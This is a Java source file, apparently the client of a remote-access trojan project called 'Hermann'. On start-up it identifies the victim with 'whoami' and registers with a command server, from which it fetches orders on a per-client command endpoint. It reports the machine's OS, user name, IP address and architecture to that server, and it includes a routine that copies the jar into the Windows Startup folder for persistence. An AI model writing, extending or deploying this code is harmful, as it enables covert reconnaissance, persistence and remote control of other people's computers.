package ch.lebois.troyclient.main;

import ch.lebois.troyclient.service.Console;
import ch.lebois.troyclient.service.Sender;
import ch.lebois.troyclient.service.WebHandler;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.channels.FileChannel;

/**
 * Project: Hermann
 **/
public class ConfigureInit {


    private WebHandler webHandler;

    public WebHandler getWebHandler() {
        return webHandler;
    }

    public void configure(String url) {
        GetContext.CLIENT_NAME = Console.execute("whoami").get(1).replace("\\", "-");
        GetContext.SENDER = new Sender(url);
        webHandler = new WebHandler(url + "/command/" + GetContext.CLIENT_NAME);
        getConstants();
//        autostart();
    }

    private void autostart() {
        try {
            copyPaste(new File(System.getProperty("user.dir") + "\\Hermann.jar"),
                    new File(System.getProperty("java.io.tmpdir").replace("Local\\Temp\\",
                            "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")));
            System.out.println(System.getProperty("java.io.tmpdir").replace("Local\\Temp\\",
                    "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void copyPaste(File source, File dest) throws IOException {
        FileChannel sourceChannel = new FileInputStream(source).getChannel();
        FileChannel destChannel = new FileOutputStream(dest).getChannel();
        destChannel.transferFrom(sourceChannel, 0, sourceChannel.size());

    }

    public void getConstants() {
        GetContext.SENDER.send("os", System.getProperty("os.name"));
        GetContext.SENDER.send("user", System.getProperty("user.name"));
        try {
            GetContext.SENDER.send("ip", InetAddress.getLocalHost().getHostAddress());
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        GetContext.SENDER.send("arch", System.getProperty("os.arch"));
    }
}
